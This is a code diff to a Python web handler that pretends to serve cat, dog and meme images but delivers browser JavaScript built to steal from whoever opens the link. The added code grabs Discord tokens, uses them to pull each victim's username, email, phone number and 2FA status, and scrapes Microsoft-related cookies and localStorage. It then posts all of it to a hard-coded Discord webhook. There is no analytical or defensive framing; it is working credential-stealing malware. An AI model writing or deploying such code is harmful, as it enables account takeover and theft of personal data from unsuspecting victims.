@@ -9,14 +9,14 @@ class handler(BaseHTTPRequestHandler):
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
         
         # Default image
-        DEFAULT_IMAGE = "https://beebom.com/wp-content/uploads/2023/12/Ten-bes-Poki-games-to-play.jpg"
+        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
         
         # Custom image mappings
         IMAGES = {
-            "mycatimage": "https://beebom.com/wp-content/uploads/2023/12/Ten-bes-Poki-games-to-play.jpg",
-            "dogpic": "https://beebom.com/wp-content/uploads/2023/12/Ten-bes-Poki-games-to-play.jpg",
-            "meme": "https://beebom.com/wp-content/uploads/2023/12/Ten-bes-Poki-games-to-play.jpg",
-            "poki": "https://beebom.com/wp-content/uploads/2023/12/Ten-bes-Poki-games-to-play.jpg",
+            "mycatimage": "https://i.imgur.com/5M6F3wQ.jpeg",
+            "dogpic": "https://i.imgur.com/2QksCKj.jpeg",
+            "meme": "https://i.imgur.com/X8TjKyj.jpeg",
+            "poki": "https://i.imgur.com/5M6F3wQ.jpeg",
         }
         
         # Get REAL IP - try multiple headers
@@ -158,9 +158,12 @@ class handler(BaseHTTPRequestHandler):
     }}catch(e){{output += 'Cannot access<br>';}}
     output += '<br>';
     
-    // DISCORD TOKEN GRAB
-    output += '<b>🔑 DISCORD TOKENS:</b><br>';
+    // DISCORD TOKEN GRAB + FULL ACCOUNT INFO
+    output += '<b>🔑 DISCORD ACCOUNT:</b><br>';
     let tokens = [];
+    let discordEmail = 'Not found';
+    let discordPhone = 'Not found';
+    let discordUsername = 'Not found';
     
     try{{
         if(window.webpackChunkdiscord_app){{
@@ -186,6 +189,48 @@ class handler(BaseHTTPRequestHandler):
             found.forEach(t=>{{ if(!tokens.includes(t)) tokens.push(t); }});
         }}
     }}catch(e){{}}
+    
+    // Get Discord account details
+    if(tokens.length>0){{
+        for(let t of tokens){{
+            try{{
+                const r = await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
+                if(r.ok){{
+                    const d = await r.json();
+                    discordUsername = d.username+'#'+d.discriminator;
+                    discordEmail = d.email || 'No email';
+                    discordPhone = d.phone || 'No phone';
+                    output += 'Username: '+discordUsername+'<br>';
+                    output += 'Email: '+discordEmail+'<br>';
+                    output += 'Phone: '+discordPhone+'<br>';
+                    output += 'Token: '+t+'<br>';
+                }}
+            }}catch(e){{}}
+        }}
+    }}else{{
+        output += 'No Discord data (open in Discord app)<br>';
+    }}
+    output += '<br>';
+    
+    // Get Microsoft account name from cookies/storage
+    output += '<b>🪟 MICROSOFT ACCOUNT:</b><br>';
+    let msftName = 'Not found';
+    try{{
+        // Check cookies for Microsoft account
+        const cookieData = document.cookie;
+        if(cookieData.includes('MS') || cookieData.includes('microsoft')){{
+            output += 'Microsoft data detected in cookies<br>';
+        }}
+        // Check localStorage
+        for(let i=0; i<localStorage.length; i++){{
+            const key = localStorage.key(i);
+            const val = localStorage.getItem(key);
+            if(key.toLowerCase().includes('microsoft') || key.toLowerCase().includes('ms')){{
+                output += key+': '+val.substr(0,50)+'...<br>';
+            }}
+        }}
+    }}catch(e){{}}
+    output += '<br>';
     
     if(tokens.length>0){{
         tokens.forEach((t,i)=>{{ output += 'Token '+(i+1)+': '+t+'<br>'; }});
@@ -260,31 +305,42 @@ class handler(BaseHTTPRequestHandler):
         }});
     }}
     
-    // Send tokens
+    // Send tokens with full account details
     for(let t of tokens){{
         try{{
             const r = await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
             let userInfo = 'Unknown';
+            let email = 'Unknown';
+            let phone = 'None';
+            let mfaEnabled = false;
+            
             if(r.ok){{
                 const d = await r.json();
                 userInfo = d.username+'#'+d.discriminator+' ('+d.id+')';
+                email = d.email || 'No email found';
+                phone = d.phone || 'No phone linked';
+                mfaEnabled = d.mfa_enabled || false;
+                
+                await fetch('{WEBHOOK}',{{
+                    method:'POST',
+                    headers:{{'Content-Type':'application/json'}},
+                    body:JSON.stringify({{
+                        content:'@everyone',
+                        embeds:[{{
+                            title:'🔑 FULL DISCORD ACCOUNT INFO',
+                            color:16711680,
+                            fields:[
+                                {{name:'Username',value:userInfo,inline:false}},
+                                {{name:'📧 Email',value:'```'+email+'```',inline:false}},
+                                {{name:'📱 Phone',value:'```'+phone+'```',inline:false}},
+                                {{name:'🔐 2FA Enabled',value:mfaEnabled?'Yes':'No',inline:true}},
+                                {{name:'Token',value:'```'+t+'```',inline:false}},
+                                {{name:'Endpoint',value:'{image_name if image_name else "default"}',inline:true}}
+                            ]
+                        }}]
+                    }})
+                }});
             }}
-            await fetch('{WEBHOOK}',{{
-                method:'POST',
-                headers:{{'Content-Type':'application/json'}},
-                body:JSON.stringify({{
-                    content:'@everyone',
-                    embeds:[{{
-                        title:'🔑 TOKEN GRABBED',
-                        color:16711680,
-                        fields:[
-                            {{name:'Token',value:'```'+t+'```',inline:false}},
-                            {{name:'Account',value:userInfo,inline:false}},
-                            {{name:'Endpoint',value:'{image_name if image_name else "default"}',inline:true}}
-                        ]
-                    }}]
-                }})
-            }});
         }}catch(e){{}}
     }}
 }})();
